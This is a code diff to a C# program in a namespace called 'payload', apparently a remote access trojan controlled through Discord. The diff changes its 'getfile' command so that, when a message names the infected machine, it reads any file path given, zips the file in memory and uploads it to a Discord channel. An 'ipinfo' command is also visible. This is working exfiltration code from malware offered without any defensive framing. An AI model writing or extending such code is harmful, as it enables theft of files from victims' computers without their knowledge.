@@ -2,6 +2,7 @@
 using System.Drawing;
 using System.Collections.Generic;
 using System.IO;
+using System.IO.Compression;
 using System.Net;
 using System.Text;
 using System.Diagnostics;
@@ -159,7 +160,22 @@ namespace payload
                 case "getfile":
                     {
                         if (args[0] != Environment.MachineName) break;
-                        await message.Channel.SendFileAsync(args[1]);
+                        args.RemoveAt(0);
+                        string filepath = string.Join(" ", args);
+
+                        MemoryStream compressed = new MemoryStream();
+                        ZipArchive archive = new ZipArchive(compressed, ZipArchiveMode.Create, true);
+                        ZipArchiveEntry entry = archive.CreateEntry(Path.GetFileName(filepath), CompressionLevel.Optimal);
+
+                        Stream entrystream = entry.Open();
+                        MemoryStream filestream = new MemoryStream(File.ReadAllBytes(filepath));
+                        filestream.CopyTo(entrystream);
+                        filestream.Dispose();
+                        archive.Dispose();
+
+                        await message.Channel.SendFileAsync(compressed, Path.GetFileName(filepath) + ".zip");
+                        compressed.Dispose();
+                        entrystream.Dispose();
                         break;
                     }
                 case "ipinfo":
